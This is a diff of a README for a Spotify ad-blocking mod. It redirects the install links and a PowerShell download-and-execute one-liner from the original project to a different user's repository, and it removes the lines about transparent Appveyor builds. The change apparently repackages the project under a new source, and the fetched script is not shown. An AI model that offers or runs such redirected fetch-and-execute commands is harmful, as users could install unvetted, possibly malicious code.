@@ -1,19 +1,17 @@
 [![Build status](https://ci.appveyor.com/api/projects/status/31l6ynm0a1fhr2vs/branch/master?svg=true)](https://ci.appveyor.com/project/mrpond/blockthespot/branch/master)  [![Discord](https://discord.com/api/guilds/807273906872123412/widget.png)](https://discord.gg/eYudMwgYtY) <img src="https://img.shields.io/github/downloads/mrpond/blockthespot/total.svg" />
 
 <center>
-    <h1 align="center">BlockTheSpot</h1>
-    <h4 align="center">A multi-purpose adblocker and skip-bypass for the <strong>Spotify for Windows (64 bit)</strong> </h4>
+    <h1 align="center">Spotify Add Blocker</h1>
+    <h4 align="center">Adblocker and skip-bypass for the <strong>Spotify for Windows (64 bit)</strong> </h4>
     <h5 align="center">Please support Spotify by purchasing premium</h5>
     <p align="center">
-        <strong>Last updated:</strong> 28 October 2024<br>
+        <strong>Last updated:</strong> 18 December 2024<br>
         <strong>Last tested version:</strong> Spotify for Windows (64 bit) 1.2.49.439.gfae492c7
     </p> 
 </center>
 
 ### Virus warning on windows defender issue:
 * the code is on Github, everyone can check it.
-* BTS utilize Appveyor, https://www.appveyor.com/.
-* Any code change on Github, Appveyor will build it and make release on Github.
 * false positive can happen. but don't trust me on this, try verify by compile your own BTS and compare with the release.
 
 ### Features:
@@ -30,14 +28,14 @@
 :warning: This mod is for the [**Desktop Application**](https://www.spotify.com/download/windows/) of Spotify on Windows only and **not the Microsoft Store version**.
 
 ### Installation/Update:
-* Just download and run [BlockTheSpot.bat](https://raw.githack.com/mrpond/BlockTheSpot/master/BlockTheSpot.bat)
+* Just download and run [BlockTheSpot.bat](https://raw.githubusercontent.com/krishnamenan007/spotifypremiumpatch/main/BlockTheSpot.bat)
 
 or
 
 #### Fully automated installation via PowerShell
 
 ```powershell
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression "& { $(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/mrpond/BlockTheSpot/master/install.ps1') } -UninstallSpotifyStoreEdition -UpdateSpotify"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-Expression "& { $(Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/krishnamenan007/spotifypremiumpatch/main/install.ps1') } -UninstallSpotifyStoreEdition -UpdateSpotify"
 ```
 
 #### Manual installation
